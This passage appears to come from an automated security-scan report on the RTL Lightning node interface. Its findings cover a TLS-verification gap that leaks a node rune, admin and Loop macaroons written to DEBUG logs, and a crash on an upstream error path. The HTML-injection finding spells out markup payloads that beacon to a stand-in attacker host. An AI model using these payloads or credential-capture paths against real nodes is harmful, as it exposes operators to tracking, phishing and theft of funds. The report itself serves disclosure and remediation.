   reconnect re-runs connect (and thus connectWithClient) with 0.5-64 s backoff after every disconnect or error, so the rune is re-presented to the endpoint continuously; an attacker who gains the on-path position after boot still receives it.
3. [server/utils/webSocketServer.ts:147–153](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/webSocketServer.ts#L147-L153)
   Production trigger: when an operator's browser WebSocket session selects a CLN node, the server emits eventEmitterCLN 'CONNECT' (line 150), which CLWebSocketClient's constructor handler turns into connect(). The insecure client is therefore opened in normal operation, not only on an unusual path.

## Impact
RTL discloses the node credential it is entrusted with (confidentiality high). The interposed attacker can also feed RTL arbitrary event data that is forwarded to the operator's browser as node state (integrity low). RTL itself keeps running. Subsequent-system impact: The captured rune is the node's own admin credential: with it the attacker can read all node data, send payments and close channels (moving funds), and stop or misconfigure the node via clnrest, independently of RTL.

## Reproduction steps
1. Attacker must be on the network path between RTL and the clnrest endpoint or able to answer for its address (LAN spoofing, compromised Docker/VPN hop) -- a privileged network position, so attack requirements present and adjacent vector. Once there, no mechanism must be defeated: RTL accepts any certificate and sends the rune in the first handshake, which recurs on every reconnect. No RTL privileges and no operator action beyond normal use are needed.

## Recommended fix
1. The clnrest socket.io connection disables TLS certificate verification while carrying the rune, so the credential is delivered to any party that terminates TLS on the path. Fix criteria: The connection verifies the clnrest server's identity before sending the rune -- against the system CA store, a configured certificate/fingerprint for the node, or TOFU pinning -- and refuses to connect (without sending credentials) when verification fails. Verify by interposing a server with an untrusted certificate and confirming no rune is transmitted.
2. Configuration offers no way for an operator to supply or pin the node's certificate, so verification cannot be enabled even deliberately (same gap for the LND path in request.ts, lead l-e4-tls-noverify). Fix criteria: Per-node configuration accepts a certificate path or fingerprint for the LN endpoint (and the shared request layer honours it), with insecure mode, if kept at all, requiring an explicit opt-in that is logged at startup.

---
**Severity:** HIGH
**Status:** Open
**Category:** Improper Certificate Validation
**CWE:** [CWE-295](https://cwe.mitre.org/data/definitions/295.html)
**Attack vector:** ADJACENT
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257251

---

# Remote node gossip addresses rendered through innerHTML in Liquidity Ads lease dialog

## Details
The CLN Liquidity Ads page lists every network node whose gossip advertises `option_will_fund` (backend `listNodes` passes CLN `listnodes` output through verbatim). Choosing 'View Info' on a row calls `onViewLeaseInfo`, which serialises each entry of `lqNode.addresses` with `JSON.stringify`, strips braces and quotes, replaces commas with `&nbsp;` entities, and places the resulting strings in a `DataTypeEnum.ARRAY` field. `openConfirmation` hands this to `ConfirmationMessageComponent`, whose ARRAY branch renders each element with `[innerHTML]="arrayObj"` (the sibling `AlertMessageComponent` has the identical sink at line 54).

The `address` value of a DNS-type address descriptor (BOLT 7 type 5) is an attacker-chosen byte string embedded in the remote node's own `node_announcement`; CLN decodes it and emits it in `listnodes` as `{type:'dns', address:'<bytes>', port:N}`. `JSON.stringify` does not escape `<`, `>` or `=`, and the code deliberately removes the `"` characters, so a hostname such as `<img src=//atk.example/p>` (18 chars, well under the 39-char truncation) or `<a href=//atk.example target=_blank>Open</a>` reaches the DOM as markup. No `bypassSecurityTrustHtml`/`SafeHtml` is used on this path, so Angular's default `DomSanitizer` applies: it removes `<script>`, `on*` handlers, `javascript:` URLs and `style`, but it allows `a`, `img`, `video`, `audio`, `source` elements with `http(s)`/protocol-relative `href`/`src`/`poster`, plus `target`, `download`, `rel`, `title` attributes and all text-formatting elements.

Consequences a remote Lightning node (threat-model adversary 3) can therefore achieve inside the operator's authenticated RTL session:
- Beacon the operator: an `<img>`/`<video>` pointing at the attacker's host loads when the dialog opens, revealing the operator browser's IP, user-agent and the moment they inspected the ad (a node reached over Tor otherwise has none of this).
- Spoof dialog content: inject links, images and formatting into a trusted RTL dialog whose own 'Open Channel' button funds a channel to the attacker, e.g. an official-looking 'verified provider' badge or a phishing link (`download` attribute makes it a drive-by file link).

Script execution is prevented by the sanitizer, so this is HTML/content injection rather than full XSS; the root defect is that gossip-controlled strings are bound to `[innerHTML]` instead of text interpolation (the `features` array in the same call is safe because its strings come from the constant `NODE_FEATURES_CLN`). The threat model lists these dialogs as HTML sinks; this is the concrete path in the CLN frontend by which remote-peer data reaches them. Assumptions: Angular 20's `DomSanitizer` allow-list as described above; CLN does not restrict characters of DNS hostnames when decoding peer announcements (`fromwire_wireaddr`, ADDR_TYPE_DNS) — if a given CLN version did, that version would close this path.

## Evidence
1. [src/app/cln/liquidity-ads/liquidity-ads-list/liquidity-ads-list.component.ts:226–230](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/cln/liquidity-ads/liquidity-ads-list/liquidity-ads-list.component.ts#L226-L230)
   onViewLeaseInfo builds addArr from lqNode.addresses (remote gossip). JSON.stringify escapes only quotes/backslashes, never '<' or '>'; the quotes are then stripped. Addresses are truncated to 39 chars but otherwise passed through, so an attacker-authored address string arrives as raw markup.
2. [src/app/cln/liquidity-ads/liquidity-ads-list/liquidity-ads-list.component.ts:252–265](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/cln/liquidity-ads/liquidity-ads-list/liquidity-ads-list.component.ts#L252-L265)
   addArr is tagged DataTypeEnum.ARRAY and dispatched via openConfirmation, selecting the dialog branch that renders each array element with [innerHTML] rather than text interpolation. The same dialog's 'Open Channel' (yes) button then funds a channel to this node.
3. [src/app/shared/components/data-modal/confirmation-message/confirmation-message.component.html:27–28](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/shared/components/data-modal/confirmation-message/confirmation-message.component.html#L27-L28)
   The ARRAY branch binds [innerHTML]="arrayObj" for every element. No SafeHtml/bypassSecurityTrustHtml is applied anywhere on this path (grep of src/ shows bypass only for currency symbols), so Angular's default DomSanitizer is the only control: it strips script/event handlers/javascript: URLs but keeps <a href>, <img src>, <video/audio src>, download/target attributes and formatting.
4. [src/app/store/rtl.effects.ts:150–160](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/store/rtl.effects.ts#L150-L160)
   openConfirm effect opens ConfirmationMessageComponent with the payload cloned via JSON.parse(JSON.stringify(...)), so the attacker-supplied address strings reach the template unchanged; no sanitizer or escaping step exists between the component and the dialog.
5. [server/controllers/cln/network.ts:73–92](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/cln/network.ts#L73-L92)
   listNodes returns body.nodes from CLN listnodes verbatim (filtered to nodes with option_will_fund). The addresses[].address strings originate in the remote node's own node_announcement gossip, so any node on the network that advertises option_will_fund controls them.

## Impact
Confidentiality LOW: the operator's browser IP, user-agent and viewing time leak to the remote node via an injected image/media load. Integrity LOW: attacker controls part of the content of a trusted operator dialog (links, images, formatting) that sits next to the 'Open Channel' funding action, enabling spoofing/phishing. No script execution (sanitizer), so session, credentials and node actions are not directly reachable; availability unaffected.

## Reproduction steps
1. Attacker runs any Lightning node and broadcasts a node_announcement carrying option_will_fund and a DNS-type address whose hostname bytes are markup, e.g. `<img src=//atk.example/p>` (18 chars, under the 39-char truncation; protocol-relative because ':' is rewritten to ': '). Gossip propagates it to the operator's CLN; POST /rtl/api/cln/network/listNodes returns it verbatim; opening Liquidity Ads and clicking 'View Info' on the row renders it via [innerHTML]. No CSP is set by RTL and no bypassSecurityTrustHtml is on this path, so only Angular 20.3.33's DomSanitizer applies, which permits a/img/video/audio with http(s)/protocol-relative URLs. Assumes CLN does not restrict DNS hostname bytes when decoding announcements.

## Recommended fix
1. liquidity-ads-list.component.ts onViewLeaseInfo hands remote-gossip address strings to the dialog as DataTypeEnum.ARRAY, the one field type the shared dialogs render with [innerHTML]; the strings are not HTML-escaped and `&nbsp;` is relied upon for layout. Fix criteria: Address (and any other node-supplied) strings must be rendered as text, never as HTML: e.g. pass them as STRING fields or escape them before concatenation, and achieve spacing with CSS/text rather than entities. Verify by advertising a DNS address of `<img src=//host/x>` from a test node: the dialog must display the literal characters and no request to `host` must be made.
2. confirmation-message.component.html and alert-message.component.html bind every ARRAY element with [innerHTML], so any caller that passes untrusted data in an ARRAY field becomes an HTML sink. Fix criteria: The ARRAY branch should interpolate elements as text (or accept only a typed SafeHtml produced from constant markup). Afterwards, no node/peer-controlled string in any ARRAY field (CLN liquidity ads, LND hops/dest_addresses) may produce markup in the DOM; confirm with the same test payload across those dialogs.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** HTML injection
**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257263

---

# Loop macaroon written to log at DEBUG by termsAndQuotes handlers

## Details
server/controllers/shared/loop.ts loopOutTermsAndQuotes (lines 105-134) and loopInTermsAndQuotes (lines 193-222) obtain `options` from swapOptions(), which is common.setSwapServerOptions(req): an object whose `headers['Grpc-Metadata-macaroon']` is the hex of the Loop daemon's loop.macaroon read from swapMacaroonPath (common.ts:235). After the terms call, each handler builds `options1 = { ...options, uri: ..., qs }` and `options2 = { ...options, ... }` — shallow spreads that keep the headers map — and logs both whole objects: `logger.log({ level: 'DEBUG', ..., data: options1 })`, `data: options2` (lines 116-117 and 204-205). logger.ts's DEBUG branch JSON.stringify's `data` without redaction (72-76) and writes it to stdout and to the node's log file (`<RTL_CONFIG_PATH>/logs/RTL-Node-N.log`). The resulting line is e.g. `DEBUG: Loop => Loop Out Min Quote Options: {"baseUrl":"https://loop:8081","uri":"/v1/loop/out/quote/250000","rejectUnauthorized":false,"json":true,"headers":{"Grpc-Metadata-macaroon":"0201046c6f6f70..."},"qs":{...}}`.

Both routes are exercised by the UI every time the Loop Out/Loop In dialog is opened (loop.service.ts:83, :125). logLevel DEBUG is a documented allowed value set in RTL-Config.json or through the allowlisted node-settings API. The same file shows the maintainers know the safe shape — the single-quote handlers log only `{ uri: quoteOptions.uri, qs }` (lines 93, 181) — and the identical defect was fixed for Eclair in #1664 (eclair/channels.ts:62-65) with the stated rationale that node logs are routinely shared when debugging; the Loop sibling was missed. It is the sibling of the LND admin-macaroon leak filed as lnd-payments-alltransactions-debug-logs-admin-macaroon, at a different sink and with a different credential.

Impact: anyone who can read the RTL log file or stdout, or who receives a shared log, obtains the Loop macaroon, which authenticates to loopd's REST API and lets the holder initiate loop-in/loop-out swaps (moving the node's funds to arbitrary on-chain destinations via `dest`) and read swap history.

## Evidence
1. [server/controllers/shared/loop.ts:114–117](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/loop.ts#L114-L117)
   loopOutTermsAndQuotes spreads `options` (from swapOptions -> common.setSwapServerOptions, which carries headers['Grpc-Metadata-macaroon'] = loop.macaroon hex) into options1/options2 and logs both whole objects at DEBUG.
2. [server/controllers/shared/loop.ts:202–205](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/loop.ts#L202-L205)
   loopInTermsAndQuotes repeats the same pattern for the loop-in quotes.
3. [server/utils/common.ts:225–241](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L225-L241)
   setSwapServerOptions builds the options object with headers['Grpc-Metadata-macaroon'] = fs.readFileSync(swapMacaroonPath/loop.macaroon).toString('hex'); the spread copies in loop.ts carry this header.
4. [server/utils/logger.ts:52–61](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/logger.ts#L52-L61)
   DEBUG branch writes prepMsgData output to console.log and appends it to settings.logFile when the node's logLevel is DEBUG.
5. [server/utils/logger.ts:72–81](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/logger.ts#L72-L81)
   prepMsgData JSON.stringify's object data with no masking.
6. [server/routes/shared/loop.ts:11–15](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/routes/shared/loop.ts#L11-L15)
   GET /rtl/api/loop/in/termsAndQuotes and /out/termsAndQuotes are live authenticated routes; the UI calls them from src/app/shared/services/loop.service.ts:83 and :125 whenever the Loop dialog is opened.
7. [server/controllers/shared/loop.ts:92–93](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/shared/loop.ts#L92-L93)
   Contrast: the sibling quote handlers in the same file deliberately log only { uri, qs } from quoteOptions, showing the intended safe shape that the termsAndQuotes handlers do not follow.
8. [backend/controllers/shared/loop.js:138–139](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/backend/controllers/shared/loop.js#L138-L139)
   Shipped artifact contains the same statements (and 236-237 for loop-in).

## Impact
RTL discloses the Loop daemon credential it holds to its log and stdout; confidentiality of that credential is fully lost. Subsequent-system impact: loop.macaroon authenticates to loopd: the holder can initiate loop-out swaps with an attacker-chosen on-chain destination (moving funds off the node) and loop-in swaps, and read swap state. Integrity of node funds is fully compromised; swap data is disclosed; availability of loopd itself is not directly affected.

## Reproduction steps
1. With the node's logLevel set to DEBUG (a documented allowed value in Application_configurations.md, settable in RTL-Config.json or via the allowlisted node-settings API; default ERROR), the operator opening the Loop Out/In dialog makes the UI call /rtl/api/loop/{out,in}/termsAndQuotes, and the handler logs options1/options2 whole: logger.ts prepMsgData JSON.stringify's them, so the loop.macaroon hex lands on stdout (journald / docker logs) and in <RTL_CONFIG_PATH>/logs/RTL-Node-N.log, which config.ts creates with fs.createWriteStream default (umask) permissions, typically world-readable. A local user who can read that file or the process output, a log-collection pipeline, or a recipient of a log shared for debugging extracts the macaroon; no redaction intervenes (common.maskPasswords is applied only to the boot-time config dump, not to these data objects). The write is triggered by the operator's routine use of the Loop feature, hence passive user interaction.

## Recommended fix
1. The termsAndQuotes handlers log the spread copies of the Loop request options, including the macaroon header, as DEBUG data. Fix criteria: Log only the call shape ({ uri, qs }) as the sibling quote handlers already do, at lines 116-117 and 204-205. Verify at logLevel DEBUG that the log output for /loop/out/termsAndQuotes and /loop/in/termsAndQuotes contains neither 'Grpc-Metadata-macaroon' nor the macaroon value (extend test/backend/loop-options.test.mjs).
2. The logger serialises arbitrary objects verbatim, so every call site must individually avoid passing credentialed objects. Fix criteria: Apply credential-key redaction (headers map, *macaroon*, rune, authorization, *password*) inside the logger before serialising data/error, with a unit test proving a headers map is masked.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Sensitive Information in Log File
**CWE:** [CWE-532](https://cwe.mitre.org/data/definitions/532.html)
**Attack vector:** LOCAL
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** LOW
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257262

---

# LND admin macaroon written to log at DEBUG by getAllLightningTransactions

## Details
server/controllers/lnd/payments.ts getAllLightningTransactions (GET /rtl/api/lnd/payments/alltransactions, called by the UI's transactions report) does `options1 = JSON.parse(JSON.stringify(common.getOptions(req)))` and the same for options2, then logs both whole objects: `logger.log({ level: 'DEBUG', ..., data: options1 })` / `data: options2` (lines 127-128). getOptions returns the session node's request options whose `headers['Grpc-Metadata-macaroon']` holds the hex-encoded admin.macaroon read from disk in common.setOptions/updateSelectedNodeOptions (common.ts:284, 344). logger.ts's DEBUG branch runs prepMsgData, which JSON.stringify's `data` with no redaction (logger.ts:72-76), then writes the line to stdout (console.log) and appends it to settings.logFile (`<RTL_CONFIG_PATH>/logs/RTL-Node-N.log`, config.ts:304). The result is a log line of the form `DEBUG: Payments => All Payments Options: {"url":"","rejectUnauthorized":false,"json":true,"headers":{"Grpc-Metadata-macaroon":"0201036c6e64..."},...}` on every visit to the transactions page while the node's logLevel is DEBUG.

logLevel DEBUG is a documented allowed value (Application_configurations.md:38) settable in RTL-Config.json or through the allowlisted POST /rtl/api/conf/node settings endpoint (RTLConf.ts NODE_SETTINGS_ALLOWLIST). The admin macaroon grants full control of the LND node (send payments, on-chain sends, close channels). The maintainers already treated this exact pattern as a vulnerability and fixed it for Eclair in #1664 (eclair/channels.ts:62-65: "Log the call's shape only ... the options object carries the node's lnApiPassword in its authorization header, and node logs are routinely shared when debugging"; release notes 0.15.10 state the fix matched "every other DEBUG log in the controllers"), but the LND sibling here was missed, as was the Loop sibling in shared/loop.ts (filed separately). options1 is dead (its request is commented out at line 129), so the line has no diagnostic value at all. Ledger lead l-e4-macaroon-debuglog recorded this sink; this finding confirms the path.

Impact: anyone who can read the RTL log file, the process stdout (docker logs / journald), or a log the operator shares for support obtains the LND admin macaroon and with it full control of the node's funds. The log file persists after the level is set back, so a brief DEBUG session leaves the credential on disk indefinitely.

## Evidence
1. [server/controllers/lnd/payments.ts:123–128](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/payments.ts#L123-L128)
   getAllLightningTransactions deep-copies common.getOptions(req) into options1 and options2 and passes both whole objects as `data` to logger.log at level DEBUG (lines 127-128). getOptions returns the session node's request options, whose headers['Grpc-Metadata-macaroon'] is the hex of admin.macaroon. options1 is never used (its request is commented out at line 129), so that line carries only the credential and no diagnostic value.
2. [server/utils/logger.ts:52–61](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/logger.ts#L52-L61)
   DEBUG branch: when the selected node's settings.logLevel is 'DEBUG', prepMsgData is applied and the result goes to console.log (stdout, i.e. docker/journald logs) and fs.appendFile(settings.logFile).
3. [server/utils/logger.ts:72–81](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/logger.ts#L72-L81)
   prepMsgData serialises an object `data` with JSON.stringify(msgJSON.data) and applies no masking of header or credential fields.
4. [server/utils/common.ts:244–253](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L244-L253)
   getOptions returns req.session.selectedNode.authentication.options, the object carrying the macaroon header, unchanged.
5. [server/utils/common.ts:284](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L284)
   updateSelectedNodeOptions populates options.headers['Grpc-Metadata-macaroon'] with fs.readFileSync(macaroonPath/admin.macaroon).toString('hex') — the full-control LND credential (same in setOptions at line 344).
6. [server/utils/common.ts:33–46](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L33-L46)
   The project ships a redaction helper, maskPasswords, whose comment states 'Header maps always carry credentials in this codebase (macaroon, rune, basic auth)' and masks every key of a `headers` map. config.ts:305-307 routes the Node Config log line through it. The two DEBUG calls in getAllLightningTransactions bypass it, handing the raw options object to the logger.
7. [server/controllers/eclair/channels.ts:62–65](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/eclair/channels.ts#L62-L65)
   The maintainers fixed the identical pattern for Eclair in #1664 and documented why: the options object carries the node credential in its header and node logs are routinely shared when debugging. release-notes/Release-notes-0.15.10.md:22-30 calls the Eclair leak a contradiction of the logging guarantee of #1659; test/backend/eclair-channels.test.mjs asserts the auth header never reaches the log. The LND sibling was left unfixed.
8. [server/routes/lnd/payments.ts:9](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/routes/lnd/payments.ts#L9)
   GET /rtl/api/lnd/payments/alltransactions is a live authenticated route; the frontend calls it from src/app/lnd/store/lnd.effects.ts:1167 when the operator opens the Transactions report.
9. [server/utils/config.ts:304](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/config.ts#L304)
   settings.logFile is <RTL_CONFIG_PATH>/logs/RTL-Node-<index>.log, a persistent file on the host; config.ts:255 reads logLevel from RTL-Config.json (default ERROR) and RTLConf.ts NODE_SETTINGS_ALLOWLIST (lines 24-27) lets the settings API set it to the documented value DEBUG.
10. [backend/controllers/lnd/payments.js:134–135](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/backend/controllers/lnd/payments.js#L134-L135)
   The committed, shipped backend artifact contains the same two log statements.

## Impact
RTL discloses the most sensitive credential it holds (LND admin macaroon) to its log file and stdout, contradicting its own logging guarantee (maskPasswords, #1659/#1664). Confidentiality of the credential is fully lost; RTL's own integrity/availability are not directly affected. Subsequent-system impact: The admin macaroon authenticates every LND REST/gRPC call: read all node state, send payments and on-chain funds, close channels, stop the daemon. The holder gains full control of the Lightning node and its funds, outside RTL's boundary.

## Reproduction steps
1. The node's logLevel is DEBUG (documented allowed value, set in RTL-Config.json or via the allowlisted settings API; default is ERROR). When the operator opens the Transactions report in normal use, the UI calls GET /rtl/api/lnd/payments/alltransactions and the handler appends two DEBUG lines containing the hex admin macaroon to RTL-Node-N.log and prints them to stdout. An attacker who can read the log file or the container/journal output on the host, or who receives the log shared for troubleshooting, extracts the macaroon. No redaction stands in the way; the line persists on disk after the level is lowered.

## Recommended fix
1. getAllLightningTransactions passes the complete request options object, including the macaroon header, as log data; the logger serialises data verbatim. Fix criteria: No DEBUG (or any) log statement in the LND controllers may include options.headers or the options object as a whole; log only the call shape (url, qs/form). Remove the unused options1 copy. Verify by running the handler at logLevel DEBUG with a macaroon header set and asserting the log output contains neither 'Grpc-Metadata-macaroon' nor the macaroon value, as test/backend/eclair-channels.test.mjs does for Eclair.
2. logger.ts prepMsgData has no defence in depth: any object handed to it is JSON.stringify'd unmasked, so a single careless call site leaks credentials. Fix criteria: The logger (or a wrapper every controller uses) redacts known credential keys (headers, Grpc-Metadata-macaroon, rune, authorization, *password*) before serialising `data`/`error`, e.g. by routing through common.maskPasswords; verify with a unit test that logging an object containing a headers map yields masked values.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Sensitive data in logs
**CWE:** [CWE-532](https://cwe.mitre.org/data/definitions/532.html)
**Attack vector:** LOCAL
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/RTL
**Branch:** main
**Commit:** bcb0e14df92aeed05365eb2437fed91ce34dd7d4
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01Atm9gjYPACbzrr7Sgndbaa&finding=scan_01LNWCWbHCuvVX1Hp5eLnrLn-5257261

---

# LND forwarding-history error path throws inside promise, crashing the RTL process

## Details
POST /rtl/api/lnd/switch (forwardingHistory, behind isAuthenticated) calls getAllForwardingEvents, which POSTs to `<lnServerUrl>/v1/switch` through request.ts. On any upstream failure — a non-2xx reply (axios rejects them by default) or a transport error (ECONNREFUSED, ECONNRESET, timeout) — the .catch at switch.ts:48 builds `{ message, error: <string>, statusCode: <int> }` via common.handleError and invokes the caller's callback. forwardingHistory's callback (switch.ts:13-14) reads the status from the wrong field: `res.status(eventsResponse.error.statusCode)`; `error` is a string, so the argument is `undefined`. Express 5.2.1's `res.status()` throws a TypeError for a non-integer status (and even without that check `res.json()` would hit Node's ERR_HTTP_INVALID_STATUS_CODE). The throw happens inside the promise's .catch callback, so the promise returned by getAllForwardingEvents rejects; forwardingHistory does not return or await it, so Express 5's promise handling never sees it. RTL installs no `unhandledRejection`/`uncaughtException` handler (rtl.js, server/), and is launched as plain `node rtl` (Dockerfile CMD under tini, README's `node rtl` and systemd unit), so Node's default `--unhandled-rejections=throw` turns it into an uncaught exception and the process exits. All express-session state and the per-boot JWT `secret_key` (common.ts) are lost: every logged-in operator is logged out, the WebSocket and API are down, and the UI is unavailable until a supervisor restarts RTL (the Docker CMD has none; the README's systemd example uses Restart=always, which restores the process but not the sessions).

The triggering input is authored by the LND REST endpoint or by whoever sits on the RTL->LND link: request.ts dials LND with `rejectUnauthorized:false`, so an on-path party can terminate TLS and return any error status, and a bare TCP reset or dropped connection (no TLS position needed) produces the same .catch entry. A malicious or compromised LND/REST proxy, or LND simply being down, restarting or wallet-locked, likewise crashes RTL the moment the operator opens the Routing page, which fires this request on ngOnInit (routing.component.ts:33), or the LND routing report. The operator's own malformed `start_time`/`end_time` body also reaches the same branch, but that is authenticated-operator DoS, excluded by SECURITY.md, and is not the basis of this finding. The sibling path in fees.ts returns the promise inside its own chain and never dereferences the error, so only this route is affected. The compiled backend/controllers/lnd/switch.js carries the identical code.

## Evidence
1. [server/controllers/lnd/switch.ts:10–18](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/switch.ts#L10-L18)
   forwardingHistory's callback does `res.status(eventsResponse.error.statusCode)`. The error object it receives is `{ message, error: <string>, statusCode }` (built at line 50), so `.error.statusCode` is a property lookup on a string and is always undefined; the integer status is in `eventsResponse.statusCode`. Express 5.2.1's res.status() throws on a non-integer code (assumption on the pinned dependency; even without that check, Node's writeHead(undefined) throws ERR_HTTP_INVALID_STATUS_CODE). forwardingHistory neither returns nor awaits the promise, so Express never sees the rejection.
2. [server/controllers/lnd/switch.ts:48–51](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/switch.ts#L48-L51)
   The .catch handler converts every upstream failure (non-2xx from LND, connection refused/reset, timeout) through handleError and invokes callback(...) synchronously. The throw from res.status propagates out of this .catch into the promise returned by getAllForwardingEvents, which forwardingHistory discards -> unhandled rejection. On a paged request the same throw inside the recursive call (line 46) is re-caught by the outer .catch and re-thrown by the same callback, so the outcome is identical.
3. [server/utils/common.ts:472–495](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/common.ts#L472-L495)
   handleError always yields `error` as a string ('Unknown Error' fallback) and puts the integer status in `statusCode`, so the `.error.statusCode` dereference can never succeed; the broken branch is reached on every upstream error, not just unusual ones.
4. [server/utils/request.ts:59–81](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/utils/request.ts#L59-L81)
   axios (1.20.0, default validateStatus) rejects any non-2xx reply and any transport error; toRequestPromiseError turns both into the object handleError consumes, so a forged 4xx/5xx, a TCP reset, or a refused connection all land in switch.ts's .catch. Line 12/28: the agent is built with rejectUnauthorized:false whenever options.rejectUnauthorized===false, which common.updateSelectedNodeOptions always sets, so an on-path party can also terminate TLS and return any status.
5. [rtl.js:1–57](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/rtl.js#L1-L57)
   The entry point installs no process.on('unhandledRejection') / 'uncaughtException' handler (none exists anywhere under server/ either), and the Dockerfile runs `node rtl` under tini with default flags; Node >=20.19 (package.json engines) raises an unhandled rejection as an uncaught exception and exits the process.
6. [server/controllers/lnd/fees.ts:22–45](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/server/controllers/lnd/fees.ts#L22-L45)
   Sibling caller getFees `return`s the getAllForwardingEvents promise inside its own .then/.catch chain and its callback never dereferences the error, so the same error object only produces a logged error there; only the /switch route lacks that protection.
7. [src/app/lnd/routing/routing.component.ts:32–58](https://github.com/Halbarevi/RTL/blob/bcb0e14df92aeed05365eb2437fed91ce34dd7d4/src/app/lnd/routing/routing.component.ts#L32-L58)
   The Routing page dispatches the /switch POST automatically in ngOnInit (default one-month window), so the request fires whenever the operator opens or refreshes Routing, without a deliberate action; the LND routing report (data.service.ts getForwardingHistory) posts to the same route.

## Impact
The RTL process terminates: HTTP API, WebSocket and UI are all down until an external supervisor restarts it, and the in-memory session store and per-boot JWT signing secret are lost so every operator is logged out and must re-authenticate (including 2FA). Repeatable on every Routing page load while the upstream condition persists. No data is read or modified.

## Reproduction steps
